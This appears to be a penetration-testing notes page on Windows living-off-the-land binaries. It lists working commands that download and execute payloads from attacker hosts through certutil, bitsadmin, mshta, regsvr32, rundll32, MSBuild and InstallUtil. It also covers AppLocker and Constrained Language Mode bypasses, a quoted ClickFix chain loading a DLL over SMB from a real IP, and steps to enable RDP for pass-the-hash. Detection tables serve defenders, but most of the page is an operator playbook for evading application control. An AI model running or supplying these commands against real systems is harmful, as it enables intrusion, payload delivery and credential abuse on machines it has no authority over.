+++
title = 'Living off the Land'
date = 2026-10-30
type = 'notes'
weight = 70
toc = true
tags = ['windows', 'privilege-escalation', 'living-off-the-land', 'lolbins']
+++

LOLBins and LOLBAS are **signed, Microsoft-shipped binaries** already present on a default Windows install. They exist so nothing unsigned touches disk — the ideal primitive when application control blocks your tooling. But the binaries are trusted while **the behaviour is not**: EDR heavily monitors `certutil`, `bitsadmin`, `mshta`, `regsvr32`, and PowerShell reaching out to the internet. Prefer an internal staging host, a non-standard filename, and cleanup.

---

## 0. What Changed in 2025–2026

Two platform changes alter which LOLBins you can rely on:

### WMIC is gone on Windows 11 24H2 / 25H2

Microsoft **formally removed `wmic.exe`** from Windows 11 24H2, 25H2, and current beta builds, completing a deprecation announced in 2021. `wmic` was one of the most abused LOLBins — remote execution (`wmic /node:... process call create`), process creation, and lateral movement all depended on it.

**What this means for you:**

| On 24H2 / 25H2 | Replacement |
|---|---|
| `wmic process call create "cmd /c ..."` | `schtasks` or PowerShell `Start-Process` |
| `wmic /node:<host> process call create` | `Invoke-WmiMethod` / `Invoke-CimMethod` (PowerShell) |
| `wmic service get ...` (unquoted paths) | `Get-CimInstance Win32_Service` |
| `wmic qfe` | `Get-HotFix` |

```powershell
# CIM replacement for wmic process creation
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd /c <payload>"}

# CIM replacement for remote execution (requires credentials)
$s = New-CimSession -ComputerName TARGET -Credential $cred
Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd /c <payload>"}
```

> **Detection note for defenders:** WMIC removal does not reduce risk — it forces adversaries onto **CIM/WMI via PowerShell**, which produces different telemetry (`Win32_Process` creation from `wmiprvse.exe` rather than `wmic.exe`). Detection rules keyed on `wmic.exe` process creation are now unreliable on affected builds.

### LOLBAS trends

- **JavaScript-based LOLBAS grew 58.4%** in Q1 2026 — `wscript`/`cscript` with `.js` files, often delivered via `mshta`.
- **Node.js malware** is rising as an execution host; npm `preinstall` scripts can invoke `mshta` or `regsvr32` directly.
- **DLL sideloading** remains the dominant companion technique to LOLBins.

---

## 1. Download Primitives

Every command below uses a signed binary that already exists on a default install.

### 1.1 `certutil` — the most abused downloader

```cmd
certutil.exe -urlcache -split -f http://10.10.14.7/nc64.exe nc64.exe
certutil.exe -verifyctl -split -f http://10.10.14.7/nc64.exe
```

`certutil` can also **decode a base64 blob** you pasted in:

```cmd
certutil -decode encoded.txt decoded.exe
```

| Property | Value |
|---|---|
| **User-Agent** | `CertUtil URL Agent` |
| **Telemetry** | Process creation with URL in command line |
| **Detection priority** | **High** — this is the single most-abused LOLBin |

> **Edge case:** `certutil -urlcache` caches the file; a second download of the same URL may return the cached copy. Use `-f` and clean the cache if the payload changes.

### 1.2 `bitsadmin` — background transfer

```cmd
bitsadmin /transfer job /download /priority foreground http://10.10.14.7/nc64.exe C:\Users\Public\nc64.exe
```

BITS is **slow and deprecated**, but present on everything back to Windows 7.

| Property | Value |
|---|---|
| **Persistence** | The transfer **survives reboots** — a background C2 channel |
| **Telemetry** | `Sysmon 3` (network connect) + `BITS-Client` log |
| **Detection** | Multi-step `/create`, `/addfile`, `/resume` splits telemetry across command lines |

PowerShell equivalent:

```powershell
Start-BitsTransfer -Source http://10.10.14.7/nc64.exe -Destination C:\Users\Public\nc64.exe
```

### 1.3 `curl.exe` — native on Windows 10 1803+ / Server 2019+

```cmd
curl.exe -o C:\Users\Public\nc64.exe http://10.10.14.7/nc64.exe
curl.exe -k -o out.exe https://10.10.14.7/nc64.exe
```

A **real `curl.exe`** in `System32`, identical syntax to Linux. Rules targeting only PowerShell downloads miss this entirely.

> **PowerShell alias trap:** Inside PowerShell, `curl` and `wget` are **aliases for `Invoke-WebRequest`**, not the real binaries. To use the real `curl.exe` from PowerShell, call `curl.exe` explicitly.

### 1.4 PowerShell download cradles

```powershell
# Invoke-WebRequest
Invoke-WebRequest -Uri "http://10.10.14.7/nc64.exe" -OutFile "$env:TEMP\nc64.exe"

# WebClient
(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.7/nc64.exe","$env:TEMP\nc64.exe")

# Fileless — download and run in memory (no disk write)
IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.7/run.ps1")
```

> **Edge case:** `-UseBasicParsing` is needed on older PowerShell where the IE first-launch configuration is absent. Without it, `Invoke-WebRequest` fails with “The response content cannot be parsed because the Internet Explorer engine is not available.”

### 1.5 The forgotten downloaders

These are functionally equivalent to `certutil` and are frequently **not covered** by rules that only watch certutil, bitsadmin, and PowerShell:

| Binary | Command | Notes |
|---|---|---|
| **`esentutl.exe`** | `esentutl /y \\webdav.evil.com\share\payload /d out.exe /o` | Uses **WebDAV**, not HTTP — different network signature |
| **`desktopimgdownldr.exe`** | `desktopimgdownldr.exe /lockscreenurl:http://10.10.14.7/p.exe /lockScreen:1` | Originally for lock-screen images; a known LOLBin downloader |
| **`GfxDownloadWrapper.exe`** | `GfxDownloadWrapper.exe "http://10.10.14.7/p.exe" "C:\Users\Public\p.exe"` | Intel graphics component; may bypass application whitelisting |
| **`MpCmdRun.exe`** | `"C:\Program Files\Windows Defender\MpCmdRun.exe" -DownloadFile -url http://10.10.14.7/p.exe -path C:\Users\Public\p.exe` | **Defender’s own CLI** — ironic and often unmonitored |
| **`msiexec.exe`** | `msiexec /q /i http://10.10.14.7/payload.msi` | Downloads **and executes** an MSI |
| **Excel / Word macros** | `URLDownloadToFile` API from VBA | Process creation shows **Office**, not a download tool |

> **Rule of thumb:** If a rule blocks `certutil` but not `esentutl` or `desktopimgdownldr`, the block is cosmetic. Enumerate what is actually allowed before assuming a download path is closed.

### 1.6 COM and .NET download paths

These avoid the recognizable cmdlets and appear in ScriptBlock logs but not as a known download binary:

```powershell
# .NET HttpClient — lower-level, no recognizable cmdlet
[System.Net.Http.HttpClient]::new().GetByteArrayAsync('http://evil.com/payload').Result

# COM XmlHttp
$x = New-Object -ComObject Msxml2.XMLHTTP
$x.Open('GET','http://evil.com/payload',$false)
$x.Send()

# COM WinHttp
$w = New-Object -ComObject WinHttp.WinHttpRequest.5.1
$w.Open('GET','http://evil.com/payload',$false)
$w.Send()
```

---

## 2. Execution Primitives (LOLBAS)

### 2.1 `mshta` — HTA execution

```cmd
mshta http://10.10.14.5/payload.hta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")
```

| Property | Value |
|---|---|
| **ATT&CK** | T1218.005 |
| **Telemetry** | `mshta.exe` spawning `cmd`, `powershell`, or a child process |
| **Edge case** | `mshta` is blocked by many AppLocker default rules; it is still one of the most observed execution LOLBins in real campaigns |

### 2.2 `regsvr32` — Squiblydoo

```cmd
regsvr32 /s /n /u /i:http://10.10.14.5/payload.sct scrobj.dll
```

`regsvr32` loads a **remote COM scriptlet** (`scrobj.dll`) and executes it **without writing the script to disk first** — the “Squiblydoo” technique. It **bypasses AppLocker script rules** because `regsvr32.exe` is a signed, whitelisted binary.

| Property | Value |
|---|---|
| **ATT&CK** | T1218.010 |
| **Edge case** | The `/i:` flag with `scrobj.dll` is the distinctive signature; a plain `regsvr32 /s payload.dll` is less suspicious but requires a local DLL |

### 2.3 `rundll32` — scriptlet execution

```cmd
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://10.10.14.5/p.sct")
```

This uses the `mshtml` **RunHTMLApplication** export to execute a scriptlet. It is a close cousin of Squiblydoo but uses `rundll32` instead of `regsvr32`.

### 2.4 `MSBuild` — inline C# execution (AppLocker bypass)

`MSBuild.exe` is a **Microsoft-signed** binary frequently allowed by AppLocker. An inline task in a `.proj` / `.csproj` file executes arbitrary C# — bypassing both the binary block and CLM.

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Exec">
    <TaskFactory />
  </Target>
  <UsingTask TaskName="TaskFactory" TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Fragment" Language="cs">
        System.Diagnostics.Process.Start("cmd.exe", "/c <payload>");
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe task.proj
```

| Property | Value |
|---|---|
| **ATT&CK** | T1127.001 |
| **Edge case** | `MSBuild.exe` path varies by .NET version — check `Framework` vs `Framework64` and `v4.0.30319` |

### 2.5 `InstallUtil` — .NET assembly proxy execution

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U malware.dll
```

`InstallUtil` executes the `Uninstall()` method of any class with `[RunInstaller(true)]`. This is used both for **arbitrary .NET execution** and for **CLM bypass** (see Section 4).

### 2.6 Other execution LOLBins

| Binary | Technique |
|---|---|
| **`regasm.exe`** / **`regsvcs.exe`** | .NET assembly registration → code execution |
| **`Presentationhost.exe`** | XBAP execution → AppLocker bypass |
| **`wscript` / `cscript`** | `.js` / `.vbs` execution — **JavaScript-based LOLBAS grew 58.4% in Q1 2026** |
| **`pcalua.exe`** | Proxy execution of `mshta.exe` (observed in 2026 ClickFix campaigns) |
| **`cmdkey` + `regsvr32`** | See Section 3 — the new ClickFix chain |

---

## 3. The New ClickFix Chain — `cmdkey` + `regsvr32` (No PowerShell)

A 2026 ClickFix variant **replaces PowerShell entirely** with two native tools:

```cmd
cmd.exe /c cmdkey /add:151.245.195.142 /user:guest && start regsvr32 /s \\151.245.195.142\hi\demo.dll &
```

**What it does:**

1. **`cmdkey /add`** stores credentials for the remote IP under the username `guest` — this allows `regsvr32` to authenticate to the SMB share.
2. **`regsvr32 /s \\...\demo.dll`** loads a DLL directly from a **UNC path** — no local file is written.
3. The DLL’s `DllRegisterServer` export triggers a hidden `CreateProcessA` that creates a **scheduled task** named `RunNotepadNow` — with the task definition pulled from a **remote XML file**, so the attacker can update the second stage without redeploying.

**Why it evades detection:** No PowerShell, no `certutil`, no file drop. The entire chain runs through `cmdkey` and `regsvr32`, both signed Microsoft binaries.

**What to monitor (and what a defender should alert on):**

- `cmdkey` usage **involving external IP addresses**.
- `regsvr32` loading a DLL from a **UNC path**.
- A scheduled task whose XML is **not stored locally**.

> **Edge case:** `regsvr32` loading a DLL from a UNC path requires the share to be reachable and the `cmdkey` credential to be accepted. In a segmented network, the SMB path may fail even when HTTP works — in that case, fall back to `regsvr32 /i:http://...` (Squiblydoo) or `mshta`.

---

## 4. AppLocker, WDAC, and CLM Bypass

If AppLocker or WDAC is enforcing **Constrained Language Mode (CLM)**, `$ExecutionContext.SessionState.LanguageMode` returns `ConstrainedLanguage`. The bypasses below are all **signed-binary proxy execution** — the binary is allowed, the payload is not.

### 4.1 PowerShell version downgrade

```powershell
powershell -version 2
```

PowerShell v2 **predates CLM**, so it runs in FullLanguage mode — unless v2 has been explicitly removed.

### 4.2 `InstallUtil` CLM bypass

A C# installer class embeds logic in `Uninstall()` and is triggered by `/U`. Inside that method, create a PowerShell **runspace** in memory — FullLanguage, AMSI bypassed **before** loading the payload:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\CLM_Bypass.exe
```

This runs **without spawning `powershell.exe`** and executes a remote AMSI-bypass script + reverse shell in FullLanguage mode.

### 4.3 `MSBuild` inline task

See Section 2.4 — same CLM bypass, different host.

### 4.4 `pwsh` (PowerShell 6+)

```powershell
pwsh -c "<payload>"
```

PowerShell 7 (`pwsh`) is a **separate binary**; WDAC/AppLocker rules written for `powershell.exe` often do not cover it.

### 4.5 `FullBypass` / `NyxInvoke`

Tools that combine **AMSI bypass + CLM bypass** and return a FullLanguage PowerShell reverse shell. Useful when you cannot compile your own installer class.

> **WDAC is harder than AppLocker.** WDAC enforcement happens **in the kernel before PowerShell initializes**, so CLM cannot be turned off from within the session. The reliable path is a **signed binary** or a **LOLBAS proxy** that is explicitly allowed — not a script-level bypass.

---

## 5. Fileless and Memory-Only Execution

| Technique | Command | Notes |
|---|---|---|
| **`IEX` + `DownloadString`** | `IEX (New-Object Net.WebClient).DownloadString('http://...')` | No disk write |
| **`mshta` remote HTA** | `mshta http://.../payload.hta` | HTA runs in memory |
| **`regsvr32` remote scriptlet** | `regsvr32 /s /n /u /i:http://.../p.sct scrobj.dll` | Squiblydoo — no local script |
| **`regsvr32` UNC DLL** | `regsvr32 /s \\attacker\share\p.dll` | New ClickFix chain |
| **MSBuild inline C#** | `MSBuild.exe task.proj` | C# compiled in memory |
| **InstallUtil runspace** | `InstallUtil.exe /U payload.exe` | PowerShell runspace in memory |

> **Fileless is not invisible.** AMSI inspects the **decrypted, deobfuscated** script content before execution. `IEX` and `DownloadString` are scanned at the point of invocation — fileless execution evades **disk-based** detection, not **AMSI**.

---

## 6. Enabling RDP (Requires Local Administrator)

```cmd
:: 1. Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

:: 2. Firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

:: 3. Enable Restricted Admin mode (required for RDP pass-the-hash)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

> **The value is inverted:** `0x0` **enables** Restricted Admin, `0x1` disables it. With it disabled, `/pth` fails.

```bash
# Password
xfreerdp /v:Target-IP /u:AdminUser /p:password

# Pass-the-hash (account must be local admin + Restricted Admin enabled)
xfreerdp /v:Target-IP /u:Administrator /pth:<NTLM_HASH> /cert:ignore
```

> **Requires local Administrator rights.** On a standard user, these registry and firewall commands fail with **Access denied** — enable RDP only after elevation.

---

## 7. Detection — What Each Technique Exposes

If you are documenting a path or writing detection logic, note the signal each technique leaves:

| Technique | Primary telemetry |
|---|---|
| `certutil -urlcache` | Process creation with URL; User-Agent `CertUtil URL Agent` |
| `bitsadmin /transfer` | `Sysmon 3` + `BITS-Client` log; survives reboot |
| `curl.exe` | Process creation; standard User-Agent — **missed by PowerShell-only rules** |
| `esentutl` / `desktopimgdownldr` | Process creation; **not covered by certutil rules** |
| `MpCmdRun -DownloadFile` | Defender’s own binary — often unmonitored |
| `mshta` | `mshta.exe` spawning a child process |
| `regsvr32 /i:... scrobj.dll` | **Squiblydoo signature** — distinctive `/i:` + `scrobj.dll` |
| `regsvr32` UNC DLL | `regsvr32` loading from `\\` — **new ClickFix signal** |
| `MSBuild.exe` | `MSBuild.exe` spawning `cmd`/`powershell` |
| `InstallUtil.exe` | `InstallUtil.exe` with `/U` |
| `cmdkey /add` | Credential Manager write with an **external IP** |
| `wmic` (pre-24H2) | **Removed on 24H2/25H2** — rules keyed on it now produce false negatives |
| `IEX` / `DownloadString` | ScriptBlock logging + AMSI |

> **The critical distinction for defenders:** WMIC removal does not reduce risk — it shifts execution to **CIM/WMI via PowerShell**, which produces different telemetry. Detection must follow the **technique**, not the binary.

---

## 8. Quick Reference — LOLBin by Goal

| Goal | First choice | Fallback |
|---|---|---|
| **Download to disk** | `certutil -urlcache -split -f` | `curl.exe`, `bitsadmin`, `esentutl` |
| **Download + execute** | `mshta http://...` | `msiexec /i http://...` |
| **Fileless execution** | `IEX (New-Object Net.WebClient).DownloadString` | `regsvr32 /i:... scrobj.dll` |
| **AppLocker bypass** | `MSBuild.exe task.proj` | `InstallUtil.exe /U` |
| **CLM bypass** | `powershell -version 2` | `InstallUtil` runspace, `pwsh` |
| **Remote execution (no wmic)** | `Invoke-CimMethod Win32_Process Create` | `schtasks /create` |
| **Background transfer** | `bitsadmin /transfer` | `Start-BitsTransfer` |
| **UNC DLL load** | `regsvr32 /s \\attacker\share\p.dll` | `cmdkey /add` first to authenticate |

---

## Field Notes

- **WMIC is gone on 24H2/25H2.** Do not build a path around `wmic` on a modern Windows 11 target — use `Invoke-CimMethod` or `schtasks`.
- **`certutil` is the most-monitored LOLBin.** If EDR is present, try `esentutl`, `desktopimgdownldr`, or `MpCmdRun` before certutil.
- **PowerShell `curl` and `wget` are aliases.** Use `curl.exe` explicitly if you want the real binary.
- **`-UseBasicParsing` is not optional on older PowerShell.** Without it, `Invoke-WebRequest` fails when the IE engine is absent.
- **Squiblydoo’s signature is `/i:` + `scrobj.dll`.** A plain `regsvr32 /s payload.dll` is a different (less suspicious) primitive that needs a local DLL.
- **The 2026 ClickFix chain uses `cmdkey` + `regsvr32`** — no PowerShell, no file drop. Monitor `cmdkey` to external IPs and `regsvr32` loading from UNC paths.
- **Fileless is not AMSI-proof.** AMSI inspects the deobfuscated script before execution; fileless evades disk detection, not memory scanning.
- **WDAC cannot be bypassed at the script level.** It enforces before PowerShell initializes — use a signed binary or an explicitly allowed LOLBAS proxy.

---

This file sits alongside the **File Transfers** and **Programs, Jobs and Services** notes: LOLBins are the download and execution primitives that get your tooling onto the target when application control blocks everything else, and the detection table tells you what each primitive exposes so you can choose the least-signatured path.
